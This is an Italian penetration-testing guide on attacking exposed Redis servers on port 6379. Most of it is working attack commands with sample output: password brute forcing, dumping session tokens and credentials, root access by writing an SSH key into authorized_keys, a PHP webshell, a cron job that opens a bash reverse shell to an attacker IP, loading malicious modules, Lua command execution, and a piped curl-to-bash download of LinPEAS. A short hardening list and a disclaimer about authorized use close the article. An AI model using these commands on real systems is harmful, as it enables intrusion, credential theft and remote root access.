---
title: 'Porta 6379 Redis: No Auth, RCE e Credential Dump'
slug: porta-6379-redis
description: >-
  Porta 6379 Redis nel pentest: accesso senza autenticazione, dump di chiavi e
  sessioni, SSH key injection, moduli malevoli e RCE.
image: /porta-6379-redis.webp
draft: false
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Redis
  - Redis RCE
  - SSH Key Injection
---

Redis (Remote Dictionary Server) è il database in-memory più usato al mondo: cache delle sessioni, code di messaggi, rate limiting, leaderboard in tempo reale, pub/sub. Ascolta sulla porta 6379 TCP e per molti anni è stato distribuito **senza autenticazione di default e in bind su tutte le interfacce**. Questo ha reso Redis uno dei servizi più sfruttati nei penetration test e uno dei path più rapidi verso una shell: se Redis è esposto senza password, bastano letteralmente quattro comandi per scrivere una chiave SSH nel server e ottenere accesso root. Nel 2026 Redis 7.x ha corretto i default (bind 127.0.0.1, protected mode), ma le installazioni legacy, i container Docker mal configurati e gli ambienti di sviluppo promossi in produzione continuano a esporre Redis senza protezione.

Redis non è solo una cache — contiene session token (session hijacking), credenziali (se l'applicazione li salva), dati business critici e configurazioni. Un Redis compromesso è spesso la porta d'ingresso per [privilege escalation](https://hackita.it/articoli/linux-privesc) e lateral movement nell'intera infrastruttura.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 6379 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 6.2.7
```

### Script Nmap

```bash
nmap -p 6379 --script=redis-info 10.10.10.40
```

```
| redis-info:
|   Version: 6.2.7
|   Operating System: Linux 5.15.0-91-generic x86_64
|   Architecture: 64 bits
|   Process ID: 1234
|   Used Memory: 2.1M
|   Connected Clients: 15
|   Uptime: 45 days
|_  Role: master
```

**Intelligence:** versione Redis e OS, architettura, PID, numero client connessi (15 = produzione), ruolo master (cerca i replica).

### Connessione diretta

```bash
redis-cli -h 10.10.10.40
```

```
10.10.10.40:6379> PING
PONG
```

`PONG` senza errori di autenticazione → **accesso completo senza password**.

Se richiede auth:

```
10.10.10.40:6379> PING
(error) NOAUTH Authentication required.
```

## 2. Credential Attack

### Senza autenticazione (default legacy)

Redis \< 6.0 non ha autenticazione di default. Redis 6.0+ ha protected mode (rifiuta connessioni remote se no password), ma se disabilitato o se l'app è in un container con bind 0.0.0.0 → esposto.

### Password comuni

```bash
# Test manuale
redis-cli -h 10.10.10.40 -a "password"
redis-cli -h 10.10.10.40 -a "redis"
redis-cli -h 10.10.10.40 -a "admin"
redis-cli -h 10.10.10.40 -a "default"
```

### Brute force

```bash
# Hydra
hydra -P /usr/share/wordlists/rockyou.txt 10.10.10.40 redis

# Nmap
nmap -p 6379 --script=redis-brute 10.10.10.40

# Metasploit
use auxiliary/scanner/redis/redis_login
set RHOSTS 10.10.10.40
run
```

### Password da file di configurazione

```bash
# Se hai accesso al filesystem
cat /etc/redis/redis.conf | grep requirepass
```

```
requirepass R3d1s_Pr0d_2025!
```

```bash
# Nelle applicazioni che si connettono a Redis
grep -riE "redis://|REDIS_URL|REDIS_PASSWORD" /opt/ /var/www/ /home/ 2>/dev/null
```

```
REDIS_URL=redis://:R3d1s_Pr0d_2025!@10.10.10.40:6379/0
```

Connection string trovata nei `.env`, `docker-compose.yml`, [repository SVN/Git](https://hackita.it/articoli/porta-3690-svn), configurazioni [Spark](https://hackita.it/articoli/porta-4040-spark-ui) e [Kibana](https://hackita.it/articoli/porta-5601-kibana).

## 3. Enumerazione Dati — Cosa C'è in Redis

### Informazioni server

```bash
10.10.10.40:6379> INFO server
# Server
redis_version:6.2.7
os:Linux 5.15.0-91-generic x86_64
config_file:/etc/redis/redis.conf
executable:/usr/bin/redis-server

10.10.10.40:6379> INFO keyspace
# Keyspace
db0:keys=15234,expires=8900
db1:keys=45,expires=0
```

15234 chiavi nel database 0 — c'è molto da esplorare.

### Dump delle chiavi

```bash
# Seleziona database
10.10.10.40:6379> SELECT 0

# Lista tutte le chiavi (ATTENZIONE: blocca Redis se milioni di chiavi)
10.10.10.40:6379> KEYS *
```

```
1) "session:abc123def456"
2) "session:ghi789jkl012"
3) "user:1:profile"
4) "user:2:profile"
5) "api_key:production"
6) "config:database"
7) "cache:products:all"
8) "queue:emails"
9) "rate_limit:10.10.10.100"
```

### Estrazione dati sensibili

```bash
# Session token (session hijacking)
10.10.10.40:6379> GET session:abc123def456
```

```json
"{\"user_id\":1,\"username\":\"admin\",\"role\":\"administrator\",\"email\":\"admin@corp.com\",\"csrf_token\":\"xyz789\"}"
```

Sessione dell'admin → usa il session cookie per impersonarlo nell'applicazione web.

```bash
# Credenziali applicazione
10.10.10.40:6379> GET config:database
```

```json
"{\"host\":\"db-prod.corp.internal\",\"port\":3306,\"user\":\"webapp\",\"password\":\"W3bApp_DB_2025!\",\"database\":\"production\"}"
```

Credenziali [MySQL](https://hackita.it/articoli/porta-3306-mysql) in chiaro.

```bash
# API keys
10.10.10.40:6379> GET api_key:production
"sk_live_abc123def456_production_stripe_key"
```

```bash
# Profili utente (possono contenere hash password)
10.10.10.40:6379> GET user:1:profile
```

```json
"{\"username\":\"admin\",\"email\":\"admin@corp.com\",\"password_hash\":\"$2b$12$abc...\",\"api_token\":\"Bearer eyJ...\"}"
```

Hash bcrypt → [Hashcat](https://hackita.it/articoli/hashcat) mode 3200. JWT token → decode e usa.

### Scan incrementale (per database grandi)

```bash
# SCAN è non-bloccante, meglio di KEYS *
10.10.10.40:6379> SCAN 0 MATCH *session* COUNT 100
10.10.10.40:6379> SCAN 0 MATCH *password* COUNT 100
10.10.10.40:6379> SCAN 0 MATCH *secret* COUNT 100
10.10.10.40:6379> SCAN 0 MATCH *token* COUNT 100
10.10.10.40:6379> SCAN 0 MATCH *key* COUNT 100
```

## 4. RCE — SSH Key Injection (il Classico)

Il metodo più noto: scrivi la tua chiave pubblica SSH nel file `authorized_keys` di root via Redis.

```bash
# 1. Genera una coppia di chiavi
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""

# 2. Prepara il payload (newline padding per non corrompere il file)
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/payload.txt

# 3. Carica in Redis
cat /tmp/payload.txt | redis-cli -h 10.10.10.40 -x set ssh_key

# 4. Cambia la directory di salvataggio
redis-cli -h 10.10.10.40 CONFIG SET dir /root/.ssh/

# 5. Cambia il nome del file di dump
redis-cli -h 10.10.10.40 CONFIG SET dbfilename "authorized_keys"

# 6. Salva il database su disco
redis-cli -h 10.10.10.40 SAVE
```

```bash
# 7. Connettiti via SSH
ssh -i /tmp/redis_rsa root@10.10.10.40
```

```
root@server:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root shell in 7 comandi.** Funziona se: Redis gira come root (o un utente con home directory scrivibile), SSH è attivo sulla [porta 22](https://hackita.it/articoli/ssh) e la directory `/root/.ssh/` esiste (o la home dell'utente Redis).

## 5. RCE — Webshell

Se c'è un web server sulla macchina e conosci il web root:

```bash
redis-cli -h 10.10.10.40
10.10.10.40:6379> CONFIG SET dir /var/www/html/
10.10.10.40:6379> CONFIG SET dbfilename "cmd.php"
10.10.10.40:6379> SET webshell "<?php system($_GET['c']); ?>"
10.10.10.40:6379> SAVE
```

```bash
# Testa la webshell
curl "http://10.10.10.40/cmd.php?c=id"
```

## 6. RCE — Crontab

```bash
redis-cli -h 10.10.10.40
10.10.10.40:6379> CONFIG SET dir /var/spool/cron/crontabs/
10.10.10.40:6379> CONFIG SET dbfilename root
10.10.10.40:6379> SET cron "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'\n\n"
10.10.10.40:6379> SAVE
```

```bash
# Listener
nc -lvnp 4444
# Attendi fino a 1 minuto → reverse shell come root
```

**Nota:** la crontab injection funziona su Debian/Ubuntu. Su CentOS/RHEL il path è `/var/spool/cron/root`.

## 7. RCE — Redis Module (Redis 4.0+)

Redis 4.0+ supporta moduli caricabili. Puoi compilare un modulo C che esegue comandi:

```bash
# Clona il modulo RCE
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
cd RedisModules-ExecuteCommand
make

# Trasferisci il .so sul server (via web server)
python3 -m http.server 8080
```

```bash
redis-cli -h 10.10.10.40
10.10.10.40:6379> MODULE LOAD /tmp/module.so
10.10.10.40:6379> system.exec "id"
"uid=999(redis) gid=999(redis) groups=999(redis)"

10.10.10.40:6379> system.rev 10.10.10.200 4444
```

Se non puoi caricare file → usa il master-slave replication attack:

```bash
# redis-rogue-server automatizza tutto
python3 redis-rogue-server.py --rhost 10.10.10.40 --lhost 10.10.10.200
```

Questo tool: crea un Redis master sulla tua macchina, forza il target a diventare slave, replica il modulo malevolo, carica il modulo ed esegue comandi.

## 8. RCE — Lua Scripting

Redis include un interprete Lua. In versioni \< 6.0 (o se non sandboxed):

```bash
10.10.10.40:6379> EVAL "return io.popen('id'):read('*a')" 0
```

Nelle versioni recenti la sandbox Lua blocca `io.popen`, ma su installazioni vecchie funziona.

```bash
# Leggi file
10.10.10.40:6379> EVAL "local f=io.open('/etc/passwd','r'); local c=f:read('*a'); f:close(); return c" 0
```

## 9. Redis Replica — Lateral Movement

### Trova i replica

```bash
10.10.10.40:6379> INFO replication
# Replication
role:master
connected_slaves:2
slave0:ip=10.10.10.41,port=6379,state=online
slave1:ip=10.10.10.42,port=6379,state=online
```

Due replica → due nuovi target con gli stessi dati.

```bash
# Connettiti ai replica
redis-cli -h 10.10.10.41
redis-cli -h 10.10.10.42
```

I replica hanno una copia completa di tutti i dati del master — incluse credenziali e sessioni. Se il master richiede password ma i replica no → accesso ai dati via replica.

### Redis Sentinel

```bash
# Se Redis Sentinel è in uso (porta 26379)
redis-cli -h 10.10.10.40 -p 26379
SENTINEL masters
SENTINEL get-master-addr-by-name mymaster
```

Rivela l'IP del master e la configurazione del cluster.

## 10. Privilege Escalation Post-Shell

Se la shell Redis gira come utente `redis` (non root):

```bash
# Enumera
id
sudo -l
find / -perm -4000 -type f 2>/dev/null

# LinPEAS
curl http://10.10.10.200/linpeas.sh | bash
```

Path comuni: [kernel exploit](https://hackita.it/articoli/kernel-exploits) se sistema vecchio, SUID binaries, sudo misconfiguration, credenziali in `/etc/redis/redis.conf` che funzionano per SSH.

## 11. Detection & Hardening

* **`requirepass`** con password forte (64+ caratteri random)
* **`bind 127.0.0.1`** — mai esporre Redis sulla rete
* **`protected-mode yes`** (default da Redis 3.2+)
* **ACL** (Redis 6.0+) — utenti con permessi granulari, non solo una password globale
* **`rename-command CONFIG ""`** — disabilita CONFIG SET (blocca SSH/webshell/cron RCE)
* **`rename-command MODULE ""`** — blocca caricamento moduli
* **`rename-command EVAL ""`** — blocca Lua scripting
* **Non eseguire Redis come root** — utente `redis` dedicato con privilegi minimi
* **Firewall** — porta 6379 solo dall'applicazione
* **TLS** (Redis 6.0+) — cifratura del traffico
* **Non salvare credenziali in chiaro** in Redis — hash lato applicazione

## 12. Cheat Sheet Finale

| Azione           | Comando                                                              |
| ---------------- | -------------------------------------------------------------------- |
| Nmap             | `nmap -sV -p 6379 --script=redis-info target`                        |
| Connessione      | `redis-cli -h target`                                                |
| Con password     | `redis-cli -h target -a password`                                    |
| Brute force      | `hydra -P wordlist target redis`                                     |
| Info server      | `INFO server`                                                        |
| Lista chiavi     | `KEYS *` o `SCAN 0 MATCH *pattern*`                                  |
| Leggi chiave     | `GET key_name`                                                       |
| Dump tipo        | `TYPE key` → `GET` / `HGETALL` / `LRANGE 0 -1` / `SMEMBERS`          |
| **SSH key RCE**  | `CONFIG SET dir /root/.ssh/` → `dbfilename authorized_keys` → `SAVE` |
| **Webshell RCE** | `CONFIG SET dir /var/www/html/` → `dbfilename cmd.php` → `SAVE`      |
| **Cron RCE**     | `CONFIG SET dir /var/spool/cron/crontabs/` → `SAVE`                  |
| Module RCE       | `MODULE LOAD /path/module.so` → `system.exec "id"`                   |
| Lua RCE          | `EVAL "return io.popen('id'):read('*a')" 0`                          |
| Replica info     | `INFO replication`                                                   |
| Sentinel         | `redis-cli -p 26379 SENTINEL masters`                                |

***

Riferimento: Redis Security documentation, HackTricks Redis, OSCP methodology. Uso esclusivo in ambienti autorizzati.
[https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)

> Se questo contenuto ti è utile, supporta il progetto HackIta con una [donazione](https://hackita.it/SUPPORTO) per mantenere le guide gratuite e aggiornate. Hai un'azienda? Scopri il nostro [penetration test professionale](https://hackita.it/servizi).
